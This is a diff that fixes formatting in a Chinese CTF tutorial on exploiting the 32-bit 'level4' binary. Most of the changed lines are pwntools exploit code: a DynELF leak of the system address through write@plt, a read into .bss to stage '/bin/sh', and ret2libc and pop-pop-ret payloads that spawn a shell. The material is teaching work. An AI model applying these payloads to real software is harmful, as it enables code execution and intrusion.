@@ -24,36 +24,35 @@ DynELF的使用条件:
 
     def leak(address):
 
-    payload = junk + p32(write_plt) + p32(main) + p32(1) + p32(address) + p32(4)
+		payload = junk + p32(write_plt) + p32(main) + p32(1) + p32(address) + p32(4)
 
-    r.sendline(payload)
+		r.sendline(payload)
 
-    leaked = r.recv(4)
+		leaked = r.recv(4)
 
-    print "[%s] -\  [%s] = [%s]" % (hex(address), hex(u32(leaked)),
-    repr(leaked))
+		print "[%s] -  [%s] = [%s]" % (hex(address), hex(u32(leaked)),repr(leaked))
 
-    return leaked
+		return leaked
 
-    d=DynELF(leak,elf=ELF('level4'))
+		d=DynELF(leak,elf=ELF('level4'))
 
-    sys_addr=d.lookup('system','libc')
+		sys_addr=d.lookup('system','libc')
 
 泄露出system的地址并且返回到了main
 
-第二次布置栈，通过read将’/bin/sh\\x00’写到bss里面，再返回main
+第二次布置栈，通过read将’/bin/sh\x00’写到bss里面，再返回main
 
-    payload2='a'\*140+p32(read_plt)+p32(main)+p32(0)+p32(bss_addr)+p32(8)
+    payload2='a'*140+p32(read_plt)+p32(main)+p32(0)+p32(bss_addr)+p32(8)
 
     r.send(payload2)
 
-    r.send('/bin/sh\\x00')
+    r.send('/bin/sh\x00')
 
 注意，第二个输入要用send而不是sendline否则会发生错误，第一个随意
 
 第三次布置栈执行system
 
-    payload3='a'\*140+p32(sys_addr)+'a'\*4+p32(bss_addr)
+    payload3='a'*140+p32(sys_addr)+'a'*4+p32(bss_addr)
 
     r.sendline(payload3)
 
@@ -112,8 +111,7 @@ r8和r9寄存来传递。在Linux系统，64位架构只使用48位的虚拟地�
 
 我们用这个0x08048509构造payload
 
-    payload ='a'*140 + p32(read_plt) + p32(ppr) + p32(0)+ p32(bss_addr) +
-    p32(8)
+    payload ='a'*140 + p32(read_plt) + p32(ppr) + p32(0)+ p32(bss_addr) +p32(8)
 
     payload+=p32(sys_addr) + p32(0xdeadbeef) + p32(bss_addr)
 
